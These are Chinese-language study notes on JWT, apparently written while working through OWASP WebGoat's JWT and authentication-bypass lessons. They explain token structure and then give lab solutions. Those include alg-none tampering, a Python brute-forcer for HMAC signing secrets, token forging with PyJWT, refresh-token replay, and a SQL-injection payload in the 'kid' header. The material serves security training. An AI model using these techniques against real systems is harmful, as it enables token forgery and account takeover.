# JWT tokens

## lesson1



## 什么是token

token是计算机术语：令牌，令牌是一种能够控制站点占有媒体的特殊帧，以区别数据帧及其他控制帧。token其实说的更通俗点可以叫暗号，在一些数据传输之前，要先进行暗号的核对，不同的暗号被授权不同的数据操作。基于 Token 的身份验证方法

使用基于 Token 的身份验证方法，在服务端不需要存储用户的登录记录。大概的流程是这样的：

1.客户端使用用户名跟密码请求登录

2.服务端收到请求，去验证用户名与密码

3.验证成功后，服务端会签发一个 Token，再把这个 Token 发送给客户端

4.客户端收到 Token 以后可以把它存储起来，比如放在 Cookie 里或者 Local Storage 里

5.客户端每次向服务端请求资源的时候需要带着服务端签发的 Token

6.服务端收到请求，然后去验证客户端请求里面带着的 Token，如果验证成功，就向客户端返回请求的数据

## lesson2

#### JSON Web Token（JWT）

 JSON Web Token（JWT）是目前最流行的跨域身份验证解决方案。

JSON Web Token (JWT)是一个开放标准(RFC 7519)，它定义了一种紧凑的、自包含的方式，用于作为JSON对象在各方之间安全地传输信息。该信息可以被验证和信任，因为它是数字签名的。 

一条JWT是被base64编码过的，包含了三段：头部，声明（也称payload），签名。中间以“.”间隔。

1. **JWT头**

JWT头部分是一个描述JWT元数据的JSON对象，通常如下所示。

{

"alg": "HS256",

"typ": "JWT"

}

在上面的代码中，alg属性表示签名使用的算法，默认为HMAC SHA256（写为HS256）；typ属性表示令牌的类型，JWT令牌统一写为JWT。

最后，使用Base64 URL算法将上述JSON对象转换为字符串保存。

2. **有效载荷**

有效载荷部分，是JWT的主体内容部分，也是一个JSON对象，包含需要传递的数据。 JWT指定七个默认字段供选择。

iss：发行人

exp：到期时间

sub：主题

aud：用户

nbf：在此之前不可用

iat：发布时间

jti：JWT ID用于标识该JWT

除以上默认字段外，我们还可以自定义私有字段，如下例：

{

"sub": "1234567890",

"name": "chongchong",

"admin": true

}

请注意，默认情况下JWT是未加密的，任何人都可以解读其内容，因此不要构建隐私信息字段，存放保密信息，以防止信息泄露。

JSON对象也使用Base64 URL算法转换为字符串保存。

3. **签名哈希**

签名哈希部分是对上面两部分数据签名，通过指定的算法生成哈希，以确保数据不会被篡改。

首先，需要指定一个密码（secret）。该密码仅仅为保存在服务器中，并且不能向用户公开。然后，使用标头中指定的签名算法（默认情况下为HMAC SHA256）根据以下公式生成签名。

HMACSHA256(base64UrlEncode(header) + "." + base64UrlEncode(payload),

secret)

在计算出签名哈希后，JWT头，有效载荷和签名哈希的三个部分组合成一个字符串，每个部分用"."分隔，就构成整个JWT对象。



![](img/JWT.png)

 该令牌采用base64编码，由三个部分组成header.claim .signature。此令牌的解码版本为: 

```
{
  "alg":"HS256",
  "typ":"JWT"
}
.
{
  "exp": 1416471934,
  "user_name": "user",
  "scope": [
    "read",
    "write"
  ],
  "authorities": [
    "ROLE_ADMIN",
    "ROLE_USER"
  ],
  "jti": "9bc92a44-0b1a-4c5e-be70-da52075b9a84",
  "client_id": "my-client-with-secret"
}
.
qxNjYSPIKSURZEMqLQQPw1Zdk6Le2FdGHRYZG7SQnNk
```



#### 和Session方式存储id的差异

Session方式存储用户id的最大弊病在于要占用大量服务器内存，对于较大型应用而言可能还要保存许多的状态。一般而言，大型应用还需要借助一些KV数据库和一系列缓存机制来实现Session的存储。

而JWT方式将用户状态分散到了客户端中，可以明显减轻服务端的内存压力。除了用户id之外，还可以存储其他的和用户相关的信息，例如该用户是否是管理员、用户所在的分桶（见[《你所应该知道的A/B测试基础》一文](/2015/08/27/introduction-to-ab-testing/）等。

虽说JWT方式让服务器有一些计算压力（例如加密、编码和解码），但是这些压力相比磁盘I/O而言或许是半斤八两。具体是否采用，需要在不同场景下用数据说话。

它是服务器群集或面向服务的跨域体系结构的话，则需要一个统一的session数据库库来保存会话数据实现共享，这样负载均衡下的每个服务器才可以正确的验证用户身份。

#### base64url算法



## lesson6

#### 更新访问令牌

 通常，令牌有两种类型：访问令牌和刷新令牌。 

访问令牌用于对服务器进行API调用。  访问令牌的寿命有限，这就是刷新令牌的使用期限。一旦访问令牌不再有效，我就可以向服务器发出请求，以通过提供刷新令牌来获取新的访问令牌。

刷新令牌可以过期，但是它们的寿命更长。 这解决了用户必须再次使用其凭证进行认证的问题。  是否使用刷新令牌和访问令牌取决于您在选择使用哪些令牌时需要牢记的几点。 

如您所见，刷新令牌是一个随机字符串，服务器可以跟踪（在内存中或存储在数据库中）以便将刷新令牌与授予该刷新令牌的用户进行匹配。  因此，在这种情况下，只要访问令牌仍然有效，我们就可以说是“无状态”会话，服务器端无需设置用户会话，令牌是自包含的。  当访问令牌不再有效时，服务器需要查询存储的刷新令牌，以确保不会以任何方式阻止该令牌。 



每当攻击者获得访问令牌的保留权时，它仅在一定时间内有效（例如10分钟）。 然后，攻击者需要刷新令牌才能获取新的访问令牌。  这就是为什么刷新令牌需要更好的保护。 也可以使刷新令牌无状态，但这意味着查看用户是否吊销令牌将变得更加困难。  服务器进行所有验证后，它必须向客户端返回一个新的刷新令牌和一个新的访问令牌。 客户端可以使用新的访问令牌进行API调用

# Broken Authentication

## Authentication Bypasses

### 认证绕过

身份验证绕过以多种方式发生，但通常利用配置或逻辑中的一些缺陷。篡改以达到合适的条件。

**隐藏输入**

最简单的形式是依赖于web页面/DOM中的隐藏输入。

**删除参数**

有时，如果攻击者不知道某个参数的正确值，他们可能会从提交中完全删除该参数，看看会发生什么。

**强迫浏览**

如果站点的某个区域没有被配置正确地保护，那么可以通过猜测/强制执行蛮力来访问该区域。

### The Scenario

您正在重新设置密码，但是从您的提供商不认识的位置或设备进行的。所以你需要回答你设置的安全问题。另一个问题是，这些安全问题也存储在另一个设备上(不在你身边)，你不记得它们。

您已经提供了您的用户名/电子邮件，并选择了另一种验证方法。



<img src="img/2FA-q.png" />

<img src="img/2FA-a.png" style="zoom:80%;" />

# JWT token解题



## lesson 4

#### JWT signing

 每个JWT令牌至少应在发送给客户端之前进行签名，如果未签名，则客户端应用程序将能够更改令牌的内容。  签名规范在此处定义，此处将描述您可以使用的特定算法。从本质上讲，您可以使用“具有SHA-2功能的HMAC”或“具有`RSASSA-PKCS1-v1_5 / ECDSA / RSASSA-PSS`的数字签名”功能对 令牌。 

 **检查签名** 

一开始先以用户的身份登入查看一下结果，然后点击刷新的符号发现是没有权限的，用bp也拦截不到请求，然后试一下删除按钮也是权限不够但是能够拦截到请求，这就可以禅师从删除的请求下手。

hide hints:

1. 选择一个不同的用户并查看您收到的返回令牌，使用delete按钮重置投票计数 

2.  解码令牌并查看其内容 

3.  在发送获取投票的请求之前，更改令牌的内容并替换cookie 

4.  将令牌中的admin字段更改为true 

5.  通过将算法更改为None并删除签名来提交令牌

    

以tom身份登录，点击删除按钮，用bp拦截请求能看到access_token的参数，把拦截到JWT token去` https://jwt.io/#debugger `解析一下能看到`pyload`中`admin`字段的值是`false`，改成`true`。用新生成的token去重放攻击即可。

#### 总结清单

* 考核点清单
  1. 获取普通用户的JWT token
  2. 修改用户的权限 admin改为true

* 漏洞点清单
  1. 利用普通用户去获得
* 漏洞利用效果
  1. 拥有管理员的操作权限

## lesson5



**JWT cracking**

 通过具有SHA-2功能的HMAC，您可以使用密钥来签名和验证令牌。 一旦找出了这个密钥，我们就可以创建一个新令牌并对其进行签名。 因此，密钥足够强大非常重要，这样暴力破解或字典攻击就不可行。 获得令牌后，就可以发起离线暴力破解或字典攻击 

**任务**

鉴于我们有以下令牌，请尝试找出秘密密钥并提交新密钥，并将用户名更改为WebGoat。

```eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJhdWQiOiJ3ZWJnb2F0Lm9yZyIsImlhdCI6MTU4MDYwOTQ0NSwiZXhwIjoxNTgwNjA5NTA1LCJzdWIiOiJ0b21Ad2ViZ29hdC5vcmciLCJ1c2VybmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYXQub3JnIiwiUm9sZSI6WyJNYW5hZ2VyIiwiUHJvamVjdCBBZG1pbmlzdHJhdG9yIl19.psJ9VjPVyN3Wc7KgIlwjHRWFWr1WRd7x1TaRDYv2LDM```

此题目**思路**：

要找到令牌的签名密钥然后修改用户名，再用找到的密钥加密。

解决**方法**：

token解析后可以看到header和pyload部分

![Token-cracking](img/Token-cracking.png)

要想伪造JWT token就要知道签名密钥，密钥可以通过爆破找到签名密钥，可取GitHub上去找字典，下面是爆破的一个脚本，脚本是参考网上的，找出密钥后再通过` https://jwt.io/#debugger `修改用户名为`WebGoat`

```
1.若签名直接校验 **成功**（原文为失败，猜测为作者手误），则 key_ 为有效密钥；

2.若因数据部分预定义字段错误（jwt.exceptions.ExpiredSignatureError, jwt.exceptions.InvalidAudienceError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.ImmatureSignatureError）导致校验失败，说明并非密钥错误导致，则 key_ 也为有效密钥；

3.若因密钥错误（jwt.exceptions.InvalidSignatureError）导致校验失败，则 key_ 为无效密钥；

4.若为其他原因（如，JWT 字符串格式错误）导致校验失败，根本无法验证当前 key_ 是否有效。
```

以下为python代码，爆破密钥

```python
import jwt
import termcolor
if __name__ == "__main__":
    jwt_str = R'eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJhdWQiOiJ3ZWJnb2F0Lm9yZyIsImlhdCI6MTU4MDYxNTg3NywiZXhwIjoxNTgwNjE1OTM3LCJzdWIiOiJ0b21Ad2ViZ29hdC5vcmciLCJ1c2VybmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYXQub3JnIiwiUm9sZSI6WyJNYW5hZ2VyIiwiUHJvamVjdCBBZG1pbmlzdHJhdG9yIl19.eohzwETD1VzctCXQ3A8ESPzAoZ7u5DDCw04M79wgefc'
    with open('D:\pycharm\pass.txt') as f:
        for line in f:
            key_ = line.strip()
            try:
                jwt.decode(jwt_str, verify=True, key=key_)
                print('\r', '\bbingo! found key -->', termcolor.colored(key_, 'green'), '<--')
                break
            except (jwt.exceptions.ExpiredSignatureError, jwt.exceptions.InvalidAudienceError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.ImmatureSignatureError):
                print('\r', '\bbingo! found key -->', termcolor.colored(key_, 'green'), '<--')
                break
            except jwt.exceptions.InvalidSignatureError:
                print('\r', ' ' * 64, '\r\btry', key_, end='', flush=True)
                continue
        else:
            print('\r', '\bsorry! no key be found.')
```

通过爆破可以找到签名密钥为business

![io-1](img/io-3.png)

修改用户名`uername`为`WebGoat`，加密方式改为business

![](img/io-1.png)

在这里犯了一个错误，没有exp的**失效日期一直没有改导致提交一直失败**，修改username后的token ，复制到题目中提交即可以通过了！

**扩展**：

可以直接用在编译器去编码token，或者也可用python3的PyJWT获取JWT

```python
import jwt

# payload
token_dict = {
    "iss": "WebGoat Token Builder",
    "aud": "webgoat.org",
    "iat": 1580615877,
    "exp": 1580615937,
    "sub": "tom@webgoat.org",
    "username": "WebGoat",
    "Email": "tom@webgoat.org",
    "Role": ["Manager", "Project Administrator"]
}
key = "shipping"
# headers
headers = {
    "alg": "HS256"
}
# 调用jwt库,生成json web token
jwt_token = jwt.encode(token_dict,  # payload, 有效载体
                       key,
                       algorithm="HS256",  # 指明签名算法方式, 默认是HS256，需要与headers中"alg"保持一致。
                       headers=headers  # json web token 数据结构包含两部分, payload(有效载体), headers(标头)
                       )
print("jwt_token")
print(jwt_token)

```

#### 总结清单

* 考核点清单
  1. 获取普通用户的JWT token
  2. 利用密钥爆破的方式去获取JWT token的签名密钥
  3. 修改token然后用密钥重新加密
  4. 时间戳要在有效范围内

* 漏洞点清单
  1. 利用普通用户去获得token
  2. 获取签名密钥后可随意改变token
* 漏洞利用效果
  1. 任意伪造token

## lesson7



#### Refreshing a token

访问令牌可以通过刷新令牌获取，此题是在通过刷新令牌获取访问令牌时没有检查刷新令牌和访问令牌的关联，这样就可以让我拿着自己的刷新令牌去刷新别人的访问令牌。因此，攻击者就可能获取旧的访问令牌。

任务：

通过去年的日志找到一种方法来订购这些书，让tom来支付

用bp拦截

![](img/jwt-re.png)

![](img/jwt-ref2.png)

解决方案：

1.通过日志来获取tom之前的访问token修改token的失效日期，

![refesh-token](img/refesh-token.png)

![refesh-token-3](img/refesh-token-3.png)

不用签名字段，在发送清酒把token签名字段删掉不需要签名字段就可以，**但是.不能去掉**

![refesh-token-1](D:\github-repositories\Wannafly-zzx\webgoat\img\refesh-token-1.png)

2.点击checkout用bp拦截checkout请求，修改Authonization字段

![refesh-token-2](img\refesh-token-2.png)

#### 总结清单

* 考核点清单
  1. 通过日志获取tom两年前的token
  2. 利用自己的刷新token刷新出tom的token

* 漏洞点清单
  1. 利用已有的刷新token刷新出任意用户的token
* 漏洞利用效果
  1. 获取被攻击者token

## lesson8

#### Final challenges



hide hints:

1.  看一下标记，特别是头部 

2. “kid”(密钥ID)头参数是一个提示，指示使用哪个密钥来保护JWS 
3.  密钥可以位于内存中的文件系统上，甚至驻留在数据库中 
4.  密钥存储在数据库中，并在验证令牌时加载 
5.  使用SQL注入，您可能能够操作您所知道的密钥并创建一个新的令牌 
6.  使用:破解' UNION select 'deletingTom' from INFORMATION_SCHEMA.SYSTEM_USERS——作为报头中的kids，将令牌的内容更改为Tom并使用新令牌攻击端点 题目中要求Jerry删除Tom 的账户，解题思路：

要删除Tom的账户就要伪造Tom的token

点击tom账户的delete按钮用bp拦截请求看看交互内容，是发送了一个post的请求，url里附带了当前账户的token，由于这个token不是tom的所以在删除Tom账户的时候提示错误：

![](img/jwt-fianl.png)

把token解析可以看到头部有一个kid字段

![tom2](img/tom2.png)



从网上找到了用到这个字段源码

![tom](img/tom.png)

那他是干什么的呢？

```java
Jwt jwt = Jwts.parser().setSigningKeyResolver(new SigningKeyResolverAdapter() {...}).parse(token); 
```

简单看一下这一段是，在我们提交token时用来解析token的，使用setSigningKeyResolver方法指定了一个解析器来获取一个key，方法里是用了kid来查找数据库获取这个key，并且数据库的select 命令指示简单的拼接，没有做任何过滤：

```sql
"SELECT key FROM jwt_keys WHERE id = '" + kid + "'"
```

这个key就是用来签名用的盐，如果知道了这个key自然就很轻松的伪造token了。所以这里可以通过注入来“指定”一个我们自定义的key值。

```text
"kid": "webgoat_key"
```

 secret 从数据库取出来时还经历了一次Base64.decode() ， 所以，我们这里注入的时候记得注入一个base64编码过后的secret key

**用union注入**

```sql
fff' union select 'enp6' FROM jwt_keys where id='webgoat_key
```

服务器组合后的语句

```sql
"SELECT key FROM jwt_keys WHERE id = 'fff' union select 'enp6' FROM jwt_keys where id='webgoat_key'"
```

 **因为fff这个id不存在，所以只会返回union后的select结果也就是enp6，这个enp6是base64加密后的zzz，因为webgoat代码里很显然是把数据库查询的结果做了一个decode，反推一下数据库里面存的应该是base64后的值**。

然后重新base64和签名，修改为Tom的账户，

![tom-final](img/tom-final.png)



![tom-final2](img/tom-final2.png)

更换token，把请求发送过去正确！ 

![tom-final3](img/tom-final3.png)

#### 总结清单

* 考核点清单
  1. 获取普通用户的JWT token
  2. 通过sql注入任意修改签名密钥
  3. 签名是利用url编码的

* 漏洞点清单
  1. sql注入修改签名密钥
  2. 利用自己的token伪造别人的token
* 漏洞利用效果
  1. 拥有其他用户的操作权限

# 参考



[10分钟了解JSON Web令牌（JWT)]( https://baijiahao.baidu.com/s?id=1608021814182894637&wfr=spider&for=pc )

 [八幅漫画理解使用JSON Web Token设计单点登录系统 ——— by John Wu](http://blog.leapoahead.com/2015/09/07/user-authentication-with-jwt/) 

 [跨站脚本攻击（XSS攻击）](http://www.cnblogs.com/bangerlee/archive/2013/04/06/3002142.html)

[负载均衡器]( https://zhuanlan.zhihu.com/p/32841479 )

[WebGoat之身份验证缺陷](https://www.jianshu.com/p/d2f9815758f4 )

[JWT Refresh Token Manipulation](https://emtunc.org/blog/11/2017/jwt-refresh-token-manipulation/ ) 

[cookie session token]( https://juejin.im/post/5de4c3c76fb9a071b86cc482 )

